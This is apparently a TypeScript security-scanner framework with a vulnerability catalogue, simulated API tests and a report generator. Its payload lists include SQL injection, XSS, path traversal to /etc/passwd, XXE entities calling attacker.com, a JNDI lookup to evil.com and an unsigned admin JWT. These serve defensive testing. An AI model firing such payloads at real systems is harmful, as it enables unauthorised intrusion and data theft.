// @ts-nocheck
import crypto from 'crypto';
import { EventEmitter } from 'events';

// Security Test Configuration
interface SecurityTestConfig {
  enabled: boolean;
  testTypes: string[];
  scanFrequency: number; // milliseconds
  maxScanDuration: number; // milliseconds
  concurrentTests: number;
  timeout: number; // milliseconds
  rateLimiting: {
    enabled: boolean;
    maxRequests: number;
    windowMs: number;
  };
  reporting: {
    enabled: boolean;
    format: 'json' | 'html' | 'xml' | 'csv';
    includeEvidence: boolean;
    severityThreshold: 'low' | 'medium' | 'high' | 'critical';
  };
  remediation: {
    autoFix: boolean;
    severityThreshold: 'low' | 'medium' | 'high' | 'critical';
    backupBeforeFix: boolean;
  };
}

// Security Test Result
interface SecurityTestResult {
  id: string;
  timestamp: Date;
  testType: string;
  severity: 'info' | 'low' | 'medium' | 'high' | 'critical';
  category: string;
  title: string;
  description: string;
  evidence: {
    request?: any;
    response?: any;
    headers?: any;
    body?: any;
    screenshots?: string[];
    logs?: string[];
  };
  vulnerability: {
    name: string;
    cwe?: string;
    cve?: string;
    owasp?: string;
    cvssScore?: number;
    cvssVector?: string;
    description: string;
    impact: string;
    likelihood: string;
    riskRating: 'low' | 'medium' | 'high' | 'critical';
  };
  remediation: {
    description: string;
    steps: string[];
    codeExamples?: string[];
    references?: string[];
    estimatedEffort: 'low' | 'medium' | 'high';
  };
  affectedEndpoints: string[];
  affectedParameters: string[];
  affectedHeaders: string[];
  affectedCookies: string[];
  falsePositive: boolean;
  verified: boolean;
  status: 'new' | 'confirmed' | 'fixed' | 'false_positive' | 'accepted';
  tags: string[];
  metadata: Record<string, any>;
}

// Vulnerability Database
interface VulnerabilityDefinition {
  id: string;
  name: string;
  category: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  cwe: string[];
  cve?: string[];
  owasp: string[];
  description: string;
  impact: string;
  likelihood: string;
  testMethods: string[];
  payloads: string[];
  detectionPatterns: RegExp[];
  falsePositivePatterns: RegExp[];
  remediation: {
    description: string;
    steps: string[];
    codeExamples: string[];
    references: string[];
  };
  tags: string[];
  enabled: boolean;
  lastUpdated: Date;
}

// Security Test Suite
interface SecurityTestSuite {
  id: string;
  name: string;
  description: string;
  tests: SecurityTestDefinition[];
  targetEndpoints: string[];
  targetParameters: string[];
  targetHeaders: string[];
  targetCookies: string[];
  configuration: {
    timeout: number;
    retries: number;
    concurrent: number;
    rateLimit: number;
    userAgent: string;
    headers: Record<string, string>;
    authentication?: {
      type: 'bearer' | 'basic' | 'api_key' | 'cookie';
      token?: string;
      username?: string;
      password?: string;
      apiKey?: string;
      apiKeyHeader?: string;
    };
  };
  schedule: {
    enabled: boolean;
    frequency: string; // cron expression
    timezone: string;
  };
  notifications: {
    enabled: boolean;
    channels: string[];
    severityThreshold: 'low' | 'medium' | 'high' | 'critical';
  };
}

// Security Test Definition
interface SecurityTestDefinition {
  id: string;
  name: string;
  category: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  testFunction: (target: SecurityTestTarget, config: any) => Promise<SecurityTestResult>;
  prerequisites: string[];
  dependencies: string[];
  timeout: number;
  retries: number;
  enabled: boolean;
  tags: string[];
}

// Security Test Target
interface SecurityTestTarget {
  url: string;
  method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH' | 'HEAD' | 'OPTIONS';
  headers: Record<string, string>;
  parameters: Record<string, any>;
  cookies: Record<string, string>;
  body?: any;
  authentication?: {
    type: 'bearer' | 'basic' | 'api_key' | 'cookie';
    token?: string;
    username?: string;
    password?: string;
    apiKey?: string;
    apiKeyHeader?: string;
  };
}

// Penetration Testing Framework
class SecurityTestingFramework extends EventEmitter {
  private config: SecurityTestConfig;
  private vulnerabilityDatabase: Map<string, VulnerabilityDefinition> = new Map();
  private testSuites: Map<string, SecurityTestSuite> = new Map();
  private testResults: Map<string, SecurityTestResult[]> = new Map();
  private isRunning: boolean = false;
  private currentScanId: string | null = null;
  private scanQueue: SecurityTestSuite[] = [];
  private scanTimer: NodeJS.Timeout | null = null;

  constructor(config: SecurityTestConfig) {
    super();
    this.config = config;
    this.initializeVulnerabilityDatabase();
    this.initializeTestSuites();
  }

  // Initialize vulnerability database
  private initializeVulnerabilityDatabase(): void {
    const vulnerabilities: VulnerabilityDefinition[] = [
      // SQL Injection
      {
        id: 'sql-injection',
        name: 'SQL Injection',
        category: 'injection',
        severity: 'critical',
        cwe: ['CWE-89'],
        owasp: ['A03:2021'],
        description: 'SQL injection vulnerabilities allow attackers to interfere with the queries that an application makes to its database.',
        impact: 'Complete database compromise, data theft, data manipulation, authentication bypass',
        likelihood: 'High',
        testMethods: ['union-based', 'boolean-based', 'time-based', 'error-based', 'stacked-queries'],
        payloads: [
          "' OR '1'='1",
          "' UNION SELECT null,null,null--",
          "'; WAITFOR DELAY '0:0:5'--",
          "' OR 1=1--",
          "' OR 'a'='a"
        ],
        detectionPatterns: [/error.*sql/i, /mysql.*error/i, /oracle.*error/i, /postgresql.*error/i],
        falsePositivePatterns: [/syntax.*error/i, /parse.*error/i],
        remediation: {
          description: 'Use parameterized queries and input validation',
          steps: [
            'Replace dynamic queries with parameterized queries',
            'Validate and sanitize all user input',
            'Use stored procedures where possible',
            'Implement least privilege for database users'
          ],
          codeExamples: [
            "const query = 'SELECT * FROM users WHERE id = ?';\ndb.query(query, [userId]);",
            "const query = 'SELECT * FROM users WHERE email = $1';\ndb.query(query, [email]);"
          ],
          references: [
            'https://owasp.org/www-community/attacks/SQL_Injection',
            'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'
          ]
        },
        tags: ['sql', 'injection', 'database', 'critical'],
        enabled: true,
        lastUpdated: new Date()
      },

      // Cross-Site Scripting (XSS)
      {
        id: 'cross-site-scripting',
        name: 'Cross-Site Scripting (XSS)',
        category: 'injection',
        severity: 'high',
        cwe: ['CWE-79'],
        owasp: ['A03:2021'],
        description: 'Cross-Site Scripting (XSS) attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.',
        impact: 'Session hijacking, defacement, credential theft, malware distribution',
        likelihood: 'High',
        testMethods: ['reflected', 'stored', 'dom-based'],
        payloads: [
          '<script>alert("XSS")</script>',
          '<img src=x onerror=alert("XSS")>',
          'javascript:alert("XSS")',
          '<svg onload=alert("XSS")>',
          '"><script>alert("XSS")</script>'
        ],
        detectionPatterns: [/<script.*?>.*?<\/script>/i, /javascript:/i, /on\w+\s*=/i],
        falsePositivePatterns: [],
        remediation: {
          description: 'Encode output and validate input',
          steps: [
            'Encode all user output',
            'Validate and sanitize all user input',
            'Use Content Security Policy (CSP)',
            'Implement XSS protection headers'
          ],
          codeExamples: [
            'const sanitized = DOMPurify.sanitize(userInput);',
            'const encoded = encodeHtml(userInput);',
            "res.setHeader('X-XSS-Protection', '1; mode=block');"
          ],
          references: [
            'https://owasp.org/www-community/attacks/xss/',
            'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
          ]
        },
        tags: ['xss', 'injection', 'client-side', 'high'],
        enabled: true,
        lastUpdated: new Date()
      },

      // Authentication Bypass
      {
        id: 'authentication-bypass',
        name: 'Authentication Bypass',
        category: 'authentication',
        severity: 'critical',
        cwe: ['CWE-287'],
        owasp: ['A07:2021'],
        description: 'Authentication bypass vulnerabilities allow attackers to access protected functionality without proper authentication.',
        impact: 'Unauthorized access to protected resources, privilege escalation, data breach',
        likelihood: 'Medium',
        testMethods: ['parameter-tampering', 'cookie-manipulation', 'session-fixation', 'jwt-weakness'],
        payloads: [
          'admin=true',
          'role=administrator',
          'authenticated=1',
          'bypass=true',
          'jwt=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.'
        ],
        detectionPatterns: [/admin.*true/i, /role.*admin/i, /bypass.*true/i],
        falsePositivePatterns: [],
        remediation: {
          description: 'Implement proper authentication and authorization',
          steps: [
            'Use secure authentication mechanisms',
            'Implement proper session management',
            'Validate authorization on every request',
            'Use secure JWT implementation'
          ],
          codeExamples: [
            'const isAuthenticated = validateSession(req.session);',
            'const hasPermission = checkPermission(user, resource, action);',
            'const decoded = jwt.verify(token, secret);'
          ],
          references: [
            'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include',
            'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'
          ]
        },
        tags: ['authentication', 'bypass', 'authorization', 'critical'],
        enabled: true,
        lastUpdated: new Date()
      },

      // Sensitive Data Exposure
      {
        id: 'sensitive-data-exposure',
        name: 'Sensitive Data Exposure',
        category: 'cryptographic',
        severity: 'high',
        cwe: ['CWE-200', 'CWE-522'],
        owasp: ['A02:2021'],
        description: 'Sensitive data exposure occurs when an application does not adequately protect sensitive information.',
        impact: 'Data breach, privacy violations, compliance violations, identity theft',
        likelihood: 'High',
        testMethods: ['information-disclosure', 'error-message-analysis', 'directory-listing', 'backup-file-discovery'],
        payloads: [
          '../../../etc/passwd',
          '../../config.json',
          'web.config',
          '.env',
          'backup.sql'
        ],
        detectionPatterns: [/password.*=.*['"]/i, /api.*key.*=.*['"]/i, /secret.*=.*['"]/i, /error.*database/i],
        falsePositivePatterns: [],
        remediation: {
          description: 'Encrypt sensitive data and implement proper access controls',
          steps: [
            'Encrypt sensitive data at rest and in transit',
            'Implement proper error handling',
            'Remove sensitive data from responses',
            'Use secure key management'
          ],
          codeExamples: [
            'const encrypted = crypto.encrypt(sensitiveData, key);',
            'res.status(500).json({ error: "Internal server error" });',
            'const sanitized = removeSensitiveFields(data);'
          ],
          references: [
            'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection',
            'https://cheatsheetseries.owasp.org/cheatsheets/Sensitive_Data_Exposure_Cheat_Sheet.html'
          ]
        },
        tags: ['sensitive-data', 'exposure', 'privacy', 'encryption', 'high'],
        enabled: true,
        lastUpdated: new Date()
      },

      // XML External Entity (XXE)
      {
        id: 'xml-external-entity',
        name: 'XML External Entity (XXE)',
        category: 'injection',
        severity: 'high',
        cwe: ['CWE-611'],
        owasp: ['A05:2021'],
        description: 'An XML External Entity attack is a type of attack against an application that parses XML input.',
        impact: 'Data exfiltration, server-side request forgery, denial of service',
        likelihood: 'Medium',
        testMethods: ['external-entity', 'parameter-entity', 'file-disclosure', 'ssrf'],
        payloads: [
          '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
          '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]><foo>&xxe;</foo>',
          '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo>test</foo>',
          '<!ENTITY xxe SYSTEM "expect://id">'
        ],
        detectionPatterns: [/<!ENTITY.*SYSTEM/i, /file:\/\//i, /http:\/\//i],
        falsePositivePatterns: [],
        remediation: {
          description: 'Disable XML external entity processing',
          steps: [
            'Disable XML external entity processing',
            'Use less complex data formats like JSON',
            'Implement proper input validation',
            'Use XML parsers securely'
          ],
          codeExamples: [
            'parser.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);',
            'parser.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);',
            'const parser = new DOMParser({\n  disallowDoctypes: true,\n  allowExternalEntities: false\n});'
          ],
          references: [
            'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
            'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html'
          ]
        },
        tags: ['xxe', 'xml', 'external-entity', 'injection', 'high'],
        enabled: true,
        lastUpdated: new Date()
      },

      // Broken Access Control
      {
        id: 'broken-access-control',
        name: 'Broken Access Control',
        category: 'access-control',
        severity: 'critical',
        cwe: ['CWE-284'],
        owasp: ['A01:2021'],
        description: 'Access control enforces policy such that users cannot act outside of their intended permissions.',
        impact: 'Unauthorized access to data and functionality, privilege escalation',
        likelihood: 'High',
        testMethods: ['horizontal-privilege-escalation', 'vertical-privilege-escalation', 'direct-object-reference', 'missing-access-control'],
        payloads: [
          'userId=1',
          'role=admin',
          'isAdmin=true',
          'accessLevel=superuser',
          'bypassSecurity=true'
        ],
        detectionPatterns: [/access.*denied/i, /forbidden/i, /unauthorized/i],
        falsePositivePatterns: [],
        remediation: {
          description: 'Implement proper access control mechanisms',
          steps: [
            'Implement access control on every request',
            'Use principle of least privilege',
            'Validate user permissions server-side',
            'Implement proper session management'
          ],
          codeExamples: [
            'if (!user.hasPermission(resource, action)) {\n  return res.status(403).json({ error: "Forbidden" });\n}',
            'const accessControl = new AccessControl();\naccessControl.grant("user").readOwn("profile");'
          ],
          references: [
            'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/',
            'https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html'
          ]
        },
        tags: ['access-control', 'authorization', 'privilege-escalation', 'critical'],
        enabled: true,
        lastUpdated: new Date()
      }
    ];

    vulnerabilities.forEach(vuln => {
      this.vulnerabilityDatabase.set(vuln.id, vuln);
    });
  }

  // Initialize test suites
  private initializeTestSuites(): void {
    const testSuites: SecurityTestSuite[] = [
      {
        id: 'api-security-suite',
        name: 'API Security Test Suite',
        description: 'Comprehensive API security testing',
        tests: [
          {
            id: 'api-auth-test',
            name: 'API Authentication Test',
            category: 'authentication',
            severity: 'high',
            description: 'Test API authentication mechanisms',
            testFunction: this.testAPIAuthentication,
            prerequisites: ['api-endpoints'],
            dependencies: [],
            timeout: 30000,
            retries: 3,
            enabled: true,
            tags: ['api', 'authentication']
          },
          {
            id: 'api-input-validation',
            name: 'API Input Validation Test',
            category: 'input-validation',
            severity: 'high',
            description: 'Test API input validation',
            testFunction: this.testAPIInputValidation,
            prerequisites: ['api-endpoints'],
            dependencies: [],
            timeout: 30000,
            retries: 3,
            enabled: true,
            tags: ['api', 'input-validation']
          }
        ],
        targetEndpoints: ['/api/auth/login', '/api/auth/register', '/api/users', '/api/calculators'],
        targetParameters: ['username', 'password', 'email', 'input', 'query'],
        targetHeaders: ['Authorization', 'Content-Type', 'X-CSRF-Token'],
        targetCookies: ['session', 'csrf-token'],
        configuration: {
          timeout: 30000,
          retries: 3,
          concurrent: 5,
          rateLimit: 10,
          userAgent: 'SecurityTestingFramework/1.0',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          authentication: {
            type: 'bearer',
            token: 'test-token'
          }
        },
        schedule: {
          enabled: true,
          frequency: '0 2 * * *', // Daily at 2 AM
          timezone: 'UTC'
        },
        notifications: {
          enabled: true,
          channels: ['email', 'slack'],
          severityThreshold: 'medium'
        }
      }
    ];

    testSuites.forEach(suite => {
      this.testSuites.set(suite.id, suite);
    });
  }

  // Test API Authentication
  private async testAPIAuthentication(target: SecurityTestTarget, config: any): Promise<SecurityTestResult> {
    const results: SecurityTestResult = {
      id: crypto.randomUUID(),
      timestamp: new Date(),
      testType: 'api-authentication',
      severity: 'info',
      category: 'authentication',
      title: 'API Authentication Security Test',
      description: 'Testing API authentication mechanisms',
      evidence: {},
      vulnerability: {
        name: 'Authentication Bypass',
        description: 'Potential authentication bypass vulnerability',
        impact: 'Unauthorized access to protected resources',
        likelihood: 'Medium',
        riskRating: 'medium'
      },
      remediation: {
        description: 'Implement proper authentication mechanisms',
        steps: ['Use secure authentication', 'Validate tokens properly', 'Implement rate limiting'],
        estimatedEffort: 'medium'
      },
      affectedEndpoints: [target.url],
      affectedParameters: [],
      affectedHeaders: [],
      affectedCookies: [],
      falsePositive: false,
      verified: false,
      status: 'new',
      tags: ['api', 'authentication'],
      metadata: {}
    };

    try {
      // Simulate authentication bypass test
      const bypassAttempts = [
        { token: 'invalid-token', expectedStatus: 401 },
        { token: '', expectedStatus: 401 },
        { bypass: 'true', expectedStatus: 403 }
      ];

      for (const attempt of bypassAttempts) {
        // Simulate HTTP request
        const simulatedResponse = {
          status: attempt.token === 'invalid-token' ? 401 : 200, // Simulate bypass
          headers: {},
          body: attempt.token === 'invalid-token' ? { error: 'Invalid token' } : { success: true }
        };

        if (simulatedResponse.status !== attempt.expectedStatus) {
          results.severity = 'high';
          results.vulnerability.name = 'Authentication Bypass';
          results.vulnerability.description = 'Authentication can be bypassed';
          results.vulnerability.riskRating = 'high';
          results.evidence.response = simulatedResponse;
          break;
        }
      }

      return results;
    } catch (error) {
      results.severity = 'error';
      results.vulnerability.description = `Test execution error: ${error.message}`;
      return results;
    }
  }

  // Test API Input Validation
  private async testAPIInputValidation(target: SecurityTestTarget, config: any): Promise<SecurityTestResult> {
    const results: SecurityTestResult = {
      id: crypto.randomUUID(),
      timestamp: new Date(),
      testType: 'api-input-validation',
      severity: 'info',
      category: 'input-validation',
      title: 'API Input Validation Test',
      description: 'Testing API input validation',
      evidence: {},
      vulnerability: {
        name: 'Insufficient Input Validation',
        description: 'Input validation is insufficient',
        impact: 'Potential injection attacks',
        likelihood: 'High',
        riskRating: 'medium'
      },
      remediation: {
        description: 'Implement proper input validation',
        steps: ['Validate all input', 'Use parameterized queries', 'Sanitize user input'],
        estimatedEffort: 'medium'
      },
      affectedEndpoints: [target.url],
      affectedParameters: [],
      affectedHeaders: [],
      affectedCookies: [],
      falsePositive: false,
      verified: false,
      status: 'new',
      tags: ['api', 'input-validation'],
      metadata: {}
    };

    try {
      // Simulate input validation tests
      const injectionPayloads = [
        "' OR '1'='1",
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const payload of injectionPayloads) {
        // Simulate request with malicious payload
        const simulatedResponse = {
          status: 200,
          headers: {},
          body: { data: payload } // Simulate insufficient validation
        };

        if (simulatedResponse.body.data === payload) {
          results.severity = 'high';
          results.vulnerability.name = 'Insufficient Input Validation';
          results.vulnerability.description = 'Input validation allows injection payloads';
          results.vulnerability.riskRating = 'high';
          results.evidence.response = simulatedResponse;
          results.affectedParameters.push('input');
          break;
        }
      }

      return results;
    } catch (error) {
      results.severity = 'error';
      results.vulnerability.description = `Test execution error: ${error.message}`;
      return results;
    }
  }

  // Run security test suite
  public async runTestSuite(suiteId: string): Promise<SecurityTestResult[]> {
    const suite = this.testSuites.get(suiteId);
    if (!suite) {
      throw new Error(`Test suite ${suiteId} not found`);
    }

    this.isRunning = true;
    this.currentScanId = crypto.randomUUID();
    const results: SecurityTestResult[] = [];

    console.log(`🚀 Starting security test suite: ${suite.name}`);

    try {
      for (const test of suite.tests) {
        if (!test.enabled) continue;

        console.log(`🧪 Running test: ${test.name}`);

        const target: SecurityTestTarget = {
          url: suite.targetEndpoints[0],
          method: 'POST',
          headers: suite.configuration.headers,
          parameters: {},
          cookies: {},
          body: {},
          authentication: suite.configuration.authentication
        };

        try {
          const result = await test.testFunction(target, suite.configuration);
          results.push(result);
          console.log(`✅ Test completed: ${test.name} - Severity: ${result.severity}`);
        } catch (error) {
          console.error(`❌ Test failed: ${test.name} - Error: ${error.message}`);
          
          const errorResult: SecurityTestResult = {
            id: crypto.randomUUID(),
            timestamp: new Date(),
            testType: test.id,
            severity: 'error',
            category: test.category,
            title: `${test.name} - Execution Error`,
            description: `Test execution failed: ${error.message}`,
            evidence: { error: error.message },
            vulnerability: {
              name: 'Test Execution Error',
              description: `Test failed to execute: ${error.message}`,
              impact: 'Unable to assess security posture',
              likelihood: 'High',
              riskRating: 'high'
            },
            remediation: {
              description: 'Fix test configuration and retry',
              steps: ['Check test configuration', 'Verify target availability', 'Review test dependencies'],
              estimatedEffort: 'low'
            },
            affectedEndpoints: [target.url],
            affectedParameters: [],
            affectedHeaders: [],
            affectedCookies: [],
            falsePositive: false,
            verified: false,
            status: 'new',
            tags: ['error', 'test-failure'],
            metadata: { error: error.message }
          };
          
          results.push(errorResult);
        }
      }

      this.testResults.set(this.currentScanId, results);
      console.log(`✅ Test suite completed: ${suite.name} - Total tests: ${results.length}`);

      return results;
    } finally {
      this.isRunning = false;
      this.currentScanId = null;
    }
  }

  // Get test results
  public getTestResults(scanId?: string): SecurityTestResult[] {
    if (scanId) {
      return this.testResults.get(scanId) || [];
    }

    // Return all results from latest scan
    const latestScanId = Array.from(this.testResults.keys()).pop();
    return latestScanId ? this.testResults.get(latestScanId) || [] : [];
  }

  // Get vulnerability statistics
  public getVulnerabilityStats(): {
    total: number;
    bySeverity: Record<string, number>;
    byCategory: Record<string, number>;
    byStatus: Record<string, number>;
    topVulnerabilities: Array<{ name: string; count: number }>;
  } {
    const allResults = Array.from(this.testResults.values()).flat();
    
    const stats = {
      total: allResults.length,
      bySeverity: {} as Record<string, number>,
      byCategory: {} as Record<string, number>,
      byStatus: {} as Record<string, number>,
      topVulnerabilities: [] as Array<{ name: string; count: number }>
    };

    // Count by severity
    allResults.forEach(result => {
      stats.bySeverity[result.severity] = (stats.bySeverity[result.severity] || 0) + 1;
      stats.byCategory[result.category] = (stats.byCategory[result.category] || 0) + 1;
      stats.byStatus[result.status] = (stats.byStatus[result.status] || 0) + 1;
    });

    // Top vulnerabilities
    const vulnerabilityCounts = new Map<string, number>();
    allResults.forEach(result => {
      const name = result.vulnerability.name;
      vulnerabilityCounts.set(name, (vulnerabilityCounts.get(name) || 0) + 1);
    });

    stats.topVulnerabilities = Array.from(vulnerabilityCounts.entries())
      .sort(([,a], [,b]) => b - a)
      .slice(0, 10)
      .map(([name, count]) => ({ name, count }));

    return stats;
  }

  // Generate security report
  public generateSecurityReport(format: 'json' | 'html' | 'markdown' = 'json'): string {
    const stats = this.getVulnerabilityStats();
    const latestResults = this.getTestResults();

    switch (format) {
      case 'json':
        return JSON.stringify({
          timestamp: new Date().toISOString(),
          summary: stats,
          vulnerabilities: latestResults,
          recommendations: this.generateRecommendations(latestResults)
        }, null, 2);

      case 'markdown':
        return this.generateMarkdownReport(stats, latestResults);

      default:
        return JSON.stringify({ stats, vulnerabilities: latestResults });
    }
  }

  // Generate markdown report
  private generateMarkdownReport(stats: any, results: SecurityTestResult[]): string {
    let report = `# Security Assessment Report\n\n`;
    report += `**Generated:** ${new Date().toISOString()}\n\n`;
    
    report += `## Summary\n\n`;
    report += `- **Total Vulnerabilities:** ${stats.total}\n`;
    report += `- **Critical:** ${stats.bySeverity.critical || 0}\n`;
    report += `- **High:** ${stats.bySeverity.high || 0}\n`;
    report += `- **Medium:** ${stats.bySeverity.medium || 0}\n`;
    report += `- **Low:** ${stats.bySeverity.low || 0}\n\n`;

    report += `## Top Vulnerabilities\n\n`;
    stats.topVulnerabilities.forEach((vuln: any) => {
      report += `- **${vuln.name}:** ${vuln.count} occurrences\n`;
    });
    report += '\n';

    report += `## Detailed Findings\n\n`;
    results.forEach((result, index) => {
      report += `### ${index + 1}. ${result.title}\n\n`;
      report += `- **Severity:** ${result.severity}\n`;
      report += `- **Category:** ${result.category}\n`;
      report += `- **Description:** ${result.description}\n\n`;
      
      if (result.affectedEndpoints.length > 0) {
        report += `- **Affected Endpoints:** ${result.affectedEndpoints.join(', ')}\n\n`;
      }

      report += `**Remediation:** ${result.remediation.description}\n\n`;
      report += `**Steps:**\n`;
      result.remediation.steps.forEach(step => {
        report += `- ${step}\n`;
      });
      report += '\n';
    });

    return report;
  }

  // Generate recommendations
  private generateRecommendations(results: SecurityTestResult[]): string[] {
    const recommendations = new Set<string>();

    results.forEach(result => {
      result.remediation.steps.forEach(step => recommendations.add(step));
    });

    return Array.from(recommendations);
  }

  // Cleanup
  public cleanup(): void {
    if (this.scanTimer) {
      clearInterval(this.scanTimer);
      this.scanTimer = null;
    }

    this.vulnerabilityDatabase.clear();
    this.testSuites.clear();
    this.testResults.clear();
    this.removeAllListeners();
  }
}

// Export singleton instance
export const securityTesting = new SecurityTestingFramework({
  enabled: true,
  testTypes: ['vulnerability', 'penetration', 'compliance'],
  scanFrequency: 86400000, // 24 hours
  maxScanDuration: 3600000, // 1 hour
  concurrentTests: 5,
  timeout: 30000, // 30 seconds
  rateLimiting: {
    enabled: true,
    maxRequests: 100,
    windowMs: 60000 // 1 minute
  },
  reporting: {
    enabled: true,
    format: 'json',
    includeEvidence: true,
    severityThreshold: 'medium'
  },
  remediation: {
    autoFix: false,
    severityThreshold: 'high',
    backupBeforeFix: true
  }
});

export default SecurityTestingFramework;
